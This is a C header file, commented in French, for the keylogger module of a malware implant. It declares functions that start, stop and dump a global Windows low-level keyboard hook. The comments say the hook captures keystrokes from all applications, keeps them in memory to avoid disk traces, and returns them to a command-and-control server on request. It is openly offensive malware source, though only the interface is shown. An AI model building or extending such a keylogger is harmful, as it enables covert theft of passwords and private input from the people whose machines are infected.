/*
 * keylog.h — Module keylogger (thread dédié, buffer en mémoire)
 *
 * Capture les frappes clavier via un hook bas-niveau Windows
 * (SetWindowsHookExA WH_KEYBOARD_LL) tournant dans un thread dédié.
 * Les frappes sont bufferisées en mémoire (pas d'I/O disque) et
 * récupérées à la demande par le C2 via la commande keylog_dump.
 *
 * Utilisation depuis l'implant :
 *   1. keylog_start()  — démarre la capture (thread + hook)
 *   2. keylog_dump()   — récupère les frappes (malloc'd, caller free)
 *   3. keylog_stop()   — arrête la capture et libère les ressources
 *
 * Thread-safety : toutes les fonctions sont thread-safe (CRITICAL_SECTION).
 *
 * MITRE ATT&CK : T1056.001 — Input Capture: Keylogging
 */

#ifndef KEYLOG_H
#define KEYLOG_H

/*
 * keylog_start — Démarre le keylogger dans un thread dédié.
 *
 * Installe un hook clavier global (WH_KEYBOARD_LL) qui capture
 * les frappes de toutes les applications.
 *
 * Retourne 0 si OK, -1 si déjà actif ou échec de création du thread.
 */
int keylog_start(void);

/*
 * keylog_stop — Arrête le keylogger et termine le thread de capture.
 *
 * Envoie WM_QUIT au thread, attend sa terminaison (3s timeout),
 * puis libère le handle et le mutex.
 *
 * Retourne 0 si OK, -1 si le keylogger n'était pas actif.
 */
int keylog_stop(void);

/*
 * keylog_dump — Retourne les frappes capturées et vide le buffer.
 *
 * Retourne un string alloué par malloc que l'appelant doit free().
 *   - "[keylogger not running]\r\n"    si inactif
 *   - "[no keystrokes captured]\r\n"   si buffer vide
 *   - contenu capturé + "\r\n"         sinon
 *
 * Le buffer est vidé après chaque dump (pas de doublons).
 */
char *keylog_dump(void);

#endif /* KEYLOG_H */
